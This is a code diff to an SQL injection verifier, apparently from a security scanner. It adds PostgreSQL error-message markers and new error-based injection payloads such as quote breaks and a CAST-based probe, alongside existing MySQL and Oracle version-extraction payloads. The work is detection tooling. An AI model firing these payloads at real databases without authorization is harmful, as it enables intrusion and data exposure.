@@ -149,6 +149,17 @@ _SQL_SPECIFIC_MARKERS = frozenset({
     "quoted string not properly terminated",
     "pg::exception",
     "postgresql error",
+    # PostgreSQL / node-postgres surface their errors as plain messages, not the
+    # framed forms above. These are the phrasings a pg target actually leaks when
+    # a quote breaks the query or a payload injects invalid syntax/types. They are
+    # distinct from the MSSQL ("unclosed quotation mark") and Oracle ("quoted
+    # string not properly terminated") variants already listed, so a pg app's
+    # errors were previously invisible to error-based detection.
+    "unterminated quoted string",
+    "unterminated quoted identifier",
+    "syntax error at or near",
+    "invalid input syntax for",
+    "operator does not exist",
     "ora-",
     "oracle error",
     "sqlite3::exception",
@@ -816,6 +827,19 @@ class SQLiVerifier(BaseVerifier):
         error_payloads = [
             "'",
             "\"",
+            # Generic + Postgres-shaped breaks. The MySQL/Oracle probes below
+            # (extractvalue/updatexml/@@version/v$version) degrade to non-marker
+            # errors on PostgreSQL - "column \"version\" does not exist",
+            # "argument of AND must be type boolean", "relation ... does not
+            # exist" - so on a pg target only the bare-quote probe matched. That
+            # is a single hit, and the two-payload confirmation below never
+            # completed, so a real error-based injection fell through to the
+            # time-based technique and was mislabelled. These give a reliable
+            # second marker hit ("syntax error at or near", "invalid input
+            # syntax for") across engines.
+            "')",
+            "'))",
+            "' AND 1=CAST('x' AS INT)--",
             "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
             "' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--",
             "' AND CAST((SELECT version())::text AS NUMERIC)--",
